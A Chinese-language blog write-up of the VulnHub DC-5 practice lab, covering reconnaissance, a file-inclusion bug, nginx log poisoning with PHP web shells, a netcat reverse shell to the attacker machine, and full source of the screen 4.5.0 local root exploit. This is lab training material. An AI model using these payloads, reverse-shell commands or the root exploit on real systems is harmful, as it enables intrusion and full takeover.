<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>vulnhub靶场记录DC-5 | w3nx1z1</title><meta name="author" content="w3nx1z1"><meta name="copyright" content="w3nx1z1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="vulnhub靶场DC-5通关记录靶场描述DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.  The plan was for DC-5 to kick it up a notch, so this mig">
<meta property="og:type" content="article">
<meta property="og:title" content="vulnhub靶场记录DC-5">
<meta property="og:url" content="http://w3nx1z1.github.io/2023/12/05/vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="w3nx1z1">
<meta property="og:description" content="vulnhub靶场DC-5通关记录靶场描述DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.  The plan was for DC-5 to kick it up a notch, so this mig">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://w3nx1z1.github.io/img/mikey.png">
<meta property="article:published_time" content="2023-12-05T12:41:12.972Z">
<meta property="article:modified_time" content="2024-01-15T09:34:42.239Z">
<meta property="article:author" content="w3nx1z1">
<meta property="article:tag" content="打靶">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://w3nx1z1.github.io/img/mikey.png"><link rel="shortcut icon" href="/img/%E8%87%AA%E7%94%B1%E4%B9%8B%E7%BF%BC.jpg"><link rel="canonical" href="http://w3nx1z1.github.io/2023/12/05/vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'vulnhub靶场记录DC-5',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-01-15 17:34:42'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="\themes\butterfly\source\css\custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="w3nx1z1" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mikey.png" onerror="onerror=null;src='/img/404.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/baobao.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="w3nx1z1"><span class="site-name">w3nx1z1</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">vulnhub靶场记录DC-5</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-05T12:41:12.972Z" title="发表于 2023-12-05 20:41:12">2023-12-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-15T09:34:42.239Z" title="更新于 2024-01-15 17:34:42">2024-01-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="vulnhub靶场记录DC-5"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="vulnhub靶场DC-5通关记录"><a href="#vulnhub靶场DC-5通关记录" class="headerlink" title="vulnhub靶场DC-5通关记录"></a>vulnhub靶场DC-5通关记录</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).

As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.

And just for the record, there is no phpmailer exploit involved. :-)

The ultimate goal of this challenge is to get root and to read the one and only flag.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.

But if you&#39;re really, really stuck, you can watch this video which shows the first step.
</code></pre>
<p>提到本次靶场中 不存在ssh服务</p>
<h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>首先 给靶机开启NAT模式 使用nmap扫描靶机ip</p>
<pre><code>nmap 192.168.160.0/24
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121443158.png" alt="image-20231212144354908"></p>
<p>扫出来是<code>192.168.160.156</code></p>
<p>在扫描详细的端口信息</p>
<pre><code>nmap -A -p- -v 192.168.160.156
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121447097.png" alt="image-20231212144708011"></p>
<pre><code>开放了80端口 存在web服务 使用nginx中间件 版本是1.6.2
开放了111端口 存在rpcbind服务 版本是2.4
</code></pre>
<h4 id="了解一下rpcbind服务"><a href="#了解一下rpcbind服务" class="headerlink" title="了解一下rpcbind服务"></a>了解一下rpcbind服务</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121514830.png" alt="image-20231212151438774"></p>
<p>这里要先说一下NFS文件系统 </p>
<pre><code>NFS(network file system)：网络文件系统。Linux下三大文件系统之一，采用C/S架构。允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS应用中，本地NFS客户端可以透明的读写位于远端NFS服务器上的文件。

NFS服务器主要进程

1 rpc.nfsd 进程
NFS 服务的主进程，主要管理客户端是否能够接入 NFS 服务器以及数据的传输。

该进程固定监听 TCP/UDP 2049 端口。

2 rpc.mountd 进程
管理和维护 NFS 文件系统，根据所设定的权限决定是否允许客户端挂载指定的共享目录。

该进程监听的端口默认是不固定的。

3 rpc.lockd 进程
提供文件锁功能，防止多个客户端同时写入一个文件。

该进程监听的端口默认是不固定的。

4 rpc.statd 进程
负责检查数据的状态及一致性，需要与 rpc.lockd 配合使用。

该进程监听的端口默认是不固定的。

5 rpcbind 进程
RPC 的端口映射器进程，监听 UDP 111 端口。

NFS服务端机器：通过NFS协议将文件共享到网络上
NFS客户端机器：通过网络挂载NFS共享目录到本地
</code></pre>
<pre><code>RPC(Remote Procedure Call):远程过程调用协议
NFS 只提供了基本的文件处理功能，而不提供任何 TCP/IP 数据传输功能。它需要借助 RPC 协议才能实现 TCP/IP 数据传输功能。

RPC 最主要的功能就是在指定每个 NFS 功能所对应的端口序号（port number ），并且回报给客户端，让客户端可以连结到正确的物理端口（port）上去。
</code></pre>
<p>一般情况下 rpcbind服务运行在111、31端口  本次靶机的rpcbind服务就开在111端口上</p>
<p>在使用whatweb进行站点CMS识别</p>
<pre><code>whatweb -v 192.168.160.156
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121537393.png" alt="image-20231212153754332"></p>
<p>使用dirb 扫一下目录</p>
<pre><code>dirb http://192.168.160.156
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121540460.png" alt="image-20231212154018411"></p>
<p>没扫出来啥东西 </p>
<h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121541907.png" alt="image-20231212154101840"></p>
<p>在contact页面 看到可以提交东西 尝试随便写点内容提交</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121552060.png" alt="image-20231212155206018"></p>
<p>发现跳转到thankyou.php 对于提交的内容 使用GET方式进行上传 </p>
<p>但是注意到 在提交之后下面的年份发生了变化 </p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121558821.png" alt="image-20231212155846787"></p>
<p>从2019年变为了2018年 </p>
<p>尝试刷新发现 即使不传入参数 只刷新页面 这个年份也会改变 怀疑存在文件包含 </p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121607142.png" alt="image-20231212160757111"></p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121608184.png" alt="image-20231212160809141"></p>
<h4 id="确认文件包含"><a href="#确认文件包含" class="headerlink" title="确认文件包含"></a>确认文件包含</h4><p>在使用dirsearch扫一下目录 </p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121605333.png" alt="image-20231212160553291"></p>
<pre><code>[16:04:27] 200 -    4KB - /contact.php                                      
[16:04:28] 301 -  184B  - /css  -&gt;  http://192.168.160.156/css/             
[16:04:36] 200 -    6KB - /faq.php                                          
[16:04:38] 200 -   17B  - /footer.php                                       
[16:04:44] 301 -  184B  - /images  -&gt;  http://192.168.160.156/images/       
[16:04:44] 403 -  570B  - /images/                                          
[16:05:30] 200 -  852B  - /thankyou.php 
</code></pre>
<p>扫出来这些页面 其中<code>contact.php faq.php thankyou.php</code> 都已经出现过  访问一下<code>footer.php</code></p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121612336.png" alt="image-20231212161256301"></p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121613522.png" alt="image-20231212161303494"></p>
<p>刷新一次 年份就会发生变化 因此<code>thankyou.php</code>存在文件包含 包含的文件是<code>footer.php</code></p>
<h4 id="使用bp找到文件包含的变量名和包含值"><a href="#使用bp找到文件包含的变量名和包含值" class="headerlink" title="使用bp找到文件包含的变量名和包含值"></a>使用bp找到文件包含的变量名和包含值</h4><p>在<code>thankyou.php</code>页面抓个包 发送到爆破页面 构造一个文件包含的GET请求头</p>
<pre><code>?1=1
</code></pre>
<p>使用集束炸弹模式(Cluster bomb) 进行爆破  集束炸弹模式是笛卡尔积的方式来进行爆破 最为全面</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121946709.png" alt="image-20231212194645640"></p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121947345.png" alt="image-20231212194700279"></p>
<p>爆破出了8组值 成功包含出<code>/etc/passwd</code>文件 得知文件包含的变量名是<code>file</code></p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121954440.png" alt="image-20231212195424378"></p>
<h4 id="进行日志包含"><a href="#进行日志包含" class="headerlink" title="进行日志包含"></a>进行日志包含</h4><p>在前面信息搜集的时候 我们得知 该站点使用的中间件是<code>nginx</code> nginx的日志一般在<code>/var/log/nginx/access.log</code>中 尝试进行包含</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121959299.png" alt="image-20231212195953211"></p>
<p>根据日志包含的知识 http请求头中<code>user-agent</code>部分的内容会出现在日志中 我们就可以在<code>user-agent</code>中写入shell 在包含日志文件 执行shell</p>
<p>我们写入</p>
<pre><code>&lt;?php phpinfo(); ?&gt;
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312122006456.png" alt="image-20231212200653362"></p>
<p>成功执行</p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>既然可以进行文件包含 我们直接在<code>user-agent</code>中写入shell</p>
<pre><code>&lt;?php passthru($_GET[&#39;123&#39;]); ?&gt;   // passthru的作用和system类似
    
使用GET方法
123=nc%20192.168.160.131%201111%20-e%20%2fbin%2fbash

或者
&lt;?php eval($_GET[&#39;123&#39;]); ?&gt;

使用GET方法
123=system(&#39;nc%20192.168.160.131%201111%20-e%20%2fbin%2fbash&#39;);
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312122047915.png" alt="image-20231212204710758"></p>
<p>在kali攻击机上监听<code>1111</code>端口</p>
<pre><code>nc -lvvp 1111
</code></pre>
<p>成功反弹shell</p>
<p>再创造一个交互式shell</p>
<pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131123536.png" alt="image-20231213112310481"></p>
<h3 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h3><h4 id="查看suid提权命令"><a href="#查看suid提权命令" class="headerlink" title="查看suid提权命令"></a>查看suid提权命令</h4><p>当前用户<code>www-data</code>还是一个低权限用户 我们先找一下在当前用户可以使用suid提权的命令</p>
<pre><code>find / -type f -perm -u=s 2&gt;dev/null
</code></pre>
<pre><code>/bin/su            
/bin/mount        
/bin/umount       
/bin/screen-4.5.0 
/usr/bin/gpasswd  
/usr/bin/procmail  
/usr/bin/at        
/usr/bin/passwd   
/usr/bin/chfn 
/usr/bin/newgrp        
/usr/bin/chsh                
/usr/lib/openssh/ssh-keysign       
/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/sbin/mount.nfs
</code></pre>
<p>看到了在DC-4中 我们使用过的老朋友<code>exim4</code>  我们先试试这次<code>exim4</code>是否也可以成功提权</p>
<h4 id="exim4提权"><a href="#exim4提权" class="headerlink" title="exim4提权"></a>exim4提权</h4><h5 id="1-查找漏洞利用脚本"><a href="#1-查找漏洞利用脚本" class="headerlink" title="1.查找漏洞利用脚本"></a>1.查找漏洞利用脚本</h5><p>先查看靶机中<code>exim4</code>命令的版本</p>
<pre><code>exim4 --version
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131307143.png" alt="image-20231213130751087"></p>
<p>得知是<code>4.84-2</code>的版本</p>
<p>使用<code>searchsploit</code>找一下漏洞利用脚本</p>
<pre><code>searchsploit exim 4.8
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131501264.png" alt="image-20231213150149193"></p>
<p>但是很可惜 并没有找到合适版本的exim4漏洞利用脚本</p>
<h5 id="2-exim4提权失败"><a href="#2-exim4提权失败" class="headerlink" title="2.exim4提权失败"></a>2.exim4提权失败</h5><h4 id="screen-4-5-0-提权"><a href="#screen-4-5-0-提权" class="headerlink" title="screen-4.5.0 提权"></a>screen-4.5.0 提权</h4><p>在前面查看suid提权命令的时候 还发现一个<code>screen-4.5.0 </code> </p>
<pre><code>GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。
GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。
screen命令虚拟了一个终端(session)，可在终端内运行命令，多次运行screen命令可以虚拟多个不同的终端；
每个session可以开启多个窗口，每个窗口有自己的shell，可以在不同的窗口中同时运行多个命令，每个命令都相当于在前台运行，可以与用户交互；
</code></pre>
<h5 id="1-查找漏洞利用脚本-1"><a href="#1-查找漏洞利用脚本-1" class="headerlink" title="1.查找漏洞利用脚本"></a>1.查找漏洞利用脚本</h5><pre><code>searchsploit screen 4.5.0
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131517098.png" alt="image-20231213151707051"></p>
<p>找到两个权限提升的漏洞利用脚本 </p>
<h5 id="2-将漏洞利用脚本保存到攻击机"><a href="#2-将漏洞利用脚本保存到攻击机" class="headerlink" title="2.将漏洞利用脚本保存到攻击机"></a>2.将漏洞利用脚本保存到攻击机</h5><pre><code>searchsploit -p linux/local/41154.sh
searchsploit -p linux/local/41152.txt
cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh
cp /usr/share/exploitdb/exploits/linux/local/41152.txt 41152.txt
</code></pre>
<h5 id="3-查看41154-sh"><a href="#3-查看41154-sh" class="headerlink" title="3.查看41154.sh"></a>3.查看41154.sh</h5><pre><code class="sh">#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo &quot;~ gnu/screenroot ~&quot;
echo &quot;[+] First, we create our shell and library...&quot;
cat &lt;&lt; EOF &gt; /tmp/libhax.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
__attribute__ ((__constructor__))
void dropshell(void)&#123;
    chown(&quot;/tmp/rootshell&quot;, 0, 0);
    chmod(&quot;/tmp/rootshell&quot;, 04755);
    unlink(&quot;/etc/ld.so.preload&quot;);
    printf(&quot;[+] done!\n&quot;);
&#125;
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat &lt;&lt; EOF &gt; /tmp/rootshell.c
#include &lt;stdio.h&gt;
int main(void)&#123;
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp(&quot;/bin/sh&quot;, NULL, NULL);
&#125;
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed
echo &quot;[+] Triggering...&quot;
screen -ls # screen itself is setuid, so...
/tmp/rootshell
</code></pre>
<h5 id="4-编译libhax-c文件"><a href="#4-编译libhax-c文件" class="headerlink" title="4.编译libhax.c文件"></a>4.编译libhax.c文件</h5><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131546987.png" alt="image-20231213154607953"></p>
<pre><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131547678.png" alt="image-20231213154753646"></p>
<h5 id="5-编译rootshell-c文件并删除"><a href="#5-编译rootshell-c文件并删除" class="headerlink" title="5.编译rootshell.c文件并删除"></a>5.编译rootshell.c文件并删除</h5><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131548171.png" alt="image-20231213154859138"></p>
<pre><code>gcc -o rootshell rootshell.c 
rm -f rootshell.c
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131550059.png" alt="image-20231213155059019"></p>
<h5 id="6-另存为新的dc5-sh文件"><a href="#6-另存为新的dc5-sh文件" class="headerlink" title="6.另存为新的dc5.sh文件"></a>6.另存为新的dc5.sh文件</h5><p>将刚才利用到的脚本和命令删除 另存为新的<code>dc5.sh</code>文件</p>
<pre><code class="sh">#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo &quot;~ gnu/screenroot ~&quot;
echo &quot;[+] First, we create our shell and library...&quot;
echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed
echo &quot;[+] Triggering...&quot;
screen -ls # screen itself is setuid, so...
/tmp/rootshell
</code></pre>
<p>保存的时候 在最后面加上 :set ff&#x3D;unix 防止脚本格式错误</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131608434.png" alt="image-20231213160812384"></p>
<h5 id="6-下载漏洞脚本到靶机"><a href="#6-下载漏洞脚本到靶机" class="headerlink" title="6.下载漏洞脚本到靶机"></a>6.下载漏洞脚本到靶机</h5><pre><code>wget http://192.168.160.150/rootshell
wget http://192.168.160.150/libhax.so
wget http://192.168.160.150/dc5.sh
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131558256.png" alt="image-20231213155855211"></p>
<h5 id="7-提权"><a href="#7-提权" class="headerlink" title="7.提权"></a>7.提权</h5><p>将这三个文件传给靶机之后 赋予<code>dc5.sh</code>执行权限</p>
<pre><code>chmod +x dc5.sh
chmod 777 dc5.sh
</code></pre>
<p>在直接执行就可以得到root权限</p>
<p>但是我这边会报错 在执行<code>rootshell</code>文件时显示glibc环境不对 可能是编译<code>rootshell</code>文件时的环境版本太高了 但前面的操作步骤是没问题的 解决的话 只能是换一个低版本的环境去编译<code>rootshell</code> </p>
<p>正常情况下就是可以直接得到root权限 进入root文件夹 看到flag文件了</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312142130449.png" alt="image-20231214213017381"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此 DC-5靶场通关</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/2023/12/05/vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">http://w3nx1z1.github.io/2023/12/05/vulnhub靶场DC-5通关记录/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/2023%E5%B9%B4%E5%BA%A6%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/" title="w3nx1z1的年度个人总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">w3nx1z1的年度个人总结</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/04/vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="vulnhub靶场记录DC-4"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">vulnhub靶场记录DC-4</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/30/vulnhub%E9%9D%B6%E5%9C%BADC-3%E9%80%9A%E5%85%B3wp/" title="vulnhub靶场记录DC-3"><div class="cover" 